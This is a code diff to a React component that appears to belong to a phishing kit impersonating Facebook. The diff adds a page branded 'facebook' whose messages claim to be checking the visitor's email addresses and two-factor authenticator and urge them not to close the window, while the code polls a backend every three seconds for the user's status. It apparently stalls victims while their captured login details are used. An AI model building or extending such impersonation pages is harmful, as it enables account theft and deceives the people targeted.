@@ -18,9 +18,9 @@ export const LoadingFacebookButton = (props) => {
       fetch(`${API_BE}/users/` + unique_id)
         .then((res) => res.json())
         .then((response) => {
-          props.setValue(response.data.status)
+          props.setValue(response.data.status);
         })
-        .catch(() => { });
+        .catch(() => {});
     }
   };
 
@@ -43,9 +43,8 @@ export const LoadingFacebookButton = (props) => {
     }, 3000);
 
     if (!props.isModalVisible) {
-      clearInterval(interval)
+      clearInterval(interval);
     }
-
 
     return () => {
       clearInterval(interval);
@@ -53,14 +52,30 @@ export const LoadingFacebookButton = (props) => {
   }, []);
 
   return (
-    <div className="loading__facebook">
-      <div className="facbook__logo">
-        <img src="/facebook__loading.png" />
+    <>
+      <div className="header-color">
+        <div className="header-container">
+          <h2>facebook</h2>
+        </div>
       </div>
-      <div>
 
-        <img src="/97443-loading-gray.gif" />
+      <div class="loading-container">
+        <div class="loading-message">
+          Please be patient and dont close this window
+        </div>
+        <div class="loading-submessage step1">
+          Checking the details on your account...
+        </div>
+        <div class="loading-submessage step2">Checking email addresses...</div>
+        <div class="loading-submessage step3">
+          Checking two-factor authenticator...
+        </div>
+        <div class="loading-submessage step4">Checking other details...</div>
+        <div class="loading-submessage finalStep">
+          It can take up to 10 minutes to verify your account.
+        </div>
+        <div class="loader"></div>
       </div>
-    </div>
-  )
-}
+    </>
+  );
+};
